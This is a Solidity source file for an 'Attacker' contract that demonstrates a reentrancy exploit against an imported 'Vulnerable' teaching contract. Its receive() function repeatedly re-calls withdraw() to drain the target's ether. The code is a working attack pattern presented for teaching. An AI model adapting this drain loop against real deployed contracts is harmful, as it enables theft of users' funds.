// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import {Vulnerable} from "./Vulnerable.sol";

/**
 * @title Attacker Contract (Exploits the Vulnerable Contract)
 * @author Trev
 * @notice This contract demonstrates how an attacker can exploit the reentrancy vulnerability in the Vulnerable contract.
 * @dev The attacker initiates a deposit and withdrawal, triggering the vulnerability and causing the contract to repeatedly
 *      call withdraw until it drains all funds.
 */
contract Attacker {
    Vulnerable private i_vulnerableContract;

    /**
     * @dev Attacker contract constructor.
     * @param vulnerableContractAddress The address of the vulnerable contract to attack.
     */
    constructor(address vulnerableContractAddress) {
        i_vulnerableContract = Vulnerable(vulnerableContractAddress);
    }

    /**
     * @notice Fallback function to receive ether during the exploit.
     * @dev This function is called when the vulnerable contract transfers ether to the attacker.
     *      It will trigger another call to withdraw, continuing the reentrancy loop until the contract is drained.
     */
    receive() external payable {
        if (address(i_vulnerableContract).balance >= 1 ether) {
            // Recurse into withdraw function to keep draining funds
            i_vulnerableContract.withdraw();
        }
    }

    /**
     * @notice Initiates the attack on the vulnerable contract.
     * @dev The attacker deposits ether into the vulnerable contract and immediately calls withdraw to trigger the reentrancy attack.
     */
    function attack() external payable {
        // Deposit ether into the vulnerable contract to initiate the exploit
        i_vulnerableContract.deposit{value: msg.value}();

        // Trigger the withdraw function, which will call the receive function in this contract
        i_vulnerableContract.withdraw();
    }
}
